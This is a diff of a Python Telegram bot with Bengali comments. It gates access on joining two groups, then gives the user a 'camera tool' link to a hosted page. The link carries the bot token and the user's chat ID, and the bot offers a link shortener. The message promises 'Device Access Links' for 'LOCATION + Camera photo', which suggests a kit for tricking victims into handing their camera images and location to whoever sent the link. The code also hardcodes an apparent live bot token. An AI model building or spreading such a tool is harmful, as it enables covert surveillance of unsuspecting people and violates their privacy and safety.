@@ -5,15 +5,12 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Cont
 
 # ========== কনফিগারেশন ==========
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8756510522:AAEOEqk0mYKuIr9c7jB0mPCk2JLxogCQhs8")
-GROUP_1_ID = int(os.getenv("GROUP_1_ID", -1003710219957))
+GROUP_1_ID = int(os.getenv("GROUP_1_ID", -1003710219957))   # আপনার গ্রুপ আইডি
 GROUP_2_ID = int(os.getenv("GROUP_2_ID", -1003867100912))
-LINK_URL = os.getenv("LINK_URL", "https://hilarious-tanuki-3a2b39.netlify.app/")  # আপনার হোস্ট করা লিংক
+LINK_URL = os.getenv("LINK_URL", "https://hilarious-tanuki-3a2b39.netlify.app/")  # আপনার HTML পেজের লিংক
 
 GROUP_1_INVITE = "https://t.me/+3sHjdk2MXxQyOGE1"
 GROUP_2_INVITE = "https://t.me/oxifgaradarkmind"
-
-# আপনার টেলিগ্রাম ইউজারনেম (যে প্রোফাইলে যাবে)
-YOUR_TELEGRAM_USERNAME = "oxifgaradarkmind"   # উদাহরণ: "ashok" বা "oxif" - আপনার আসল ইউজারনেম দিন
 
 logging.basicConfig(level=logging.INFO)
 
@@ -32,7 +29,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    user_id = query.from_user.id
+    user_id = query.from_user.id   # ইউজার A (যে টুল ব্যবহার করবে)
     try:
         member1 = await context.bot.get_chat_member(GROUP_1_ID, user_id)
         member2 = await context.bot.get_chat_member(GROUP_2_ID, user_id)
@@ -44,18 +41,15 @@ async def check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ok2 = member2.status in ["member", "administrator", "creator"]
 
     if ok1 and ok2:
-        # ইউজারের জন্য ইউনিক লিংক (তার চ্যাট আইডি সহ)
+        # লিংক তৈরি: ইউজার A-এর chat_id প্যারামিটার হিসেবে যাবে
         user_link = f"{LINK_URL}?bot={BOT_TOKEN}&chat={user_id}"
-        
-        # বাটন তৈরি
         keyboard = [
             [InlineKeyboardButton("🎯 ওপেন ক্যামেরা টুল", url=user_link)],
-            [InlineKeyboardButton("👤 Allffie", url=f"https://t.me/{YOUR_TELEGRAM_USERNAME}"),
-             InlineKeyboardButton("🕷️ OXIF", url=f"https://t.me/{YOUR_TELEGRAM_USERNAME}")],
+            [InlineKeyboardButton("👤 অশোক", url="https://t.me/your_username"),
+             InlineKeyboardButton("🕷️ অক্সিফ", url="https://t.me/your_username")],
             [InlineKeyboardButton("🔗 লিংক শর্ট করুন", url="https://lc.cx/en")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        
         await query.edit_message_text(
             "🎯 **Your Device Access Links** ↙️\n\n"
             "🔸 LOCATION + Camera photo and info:\n"
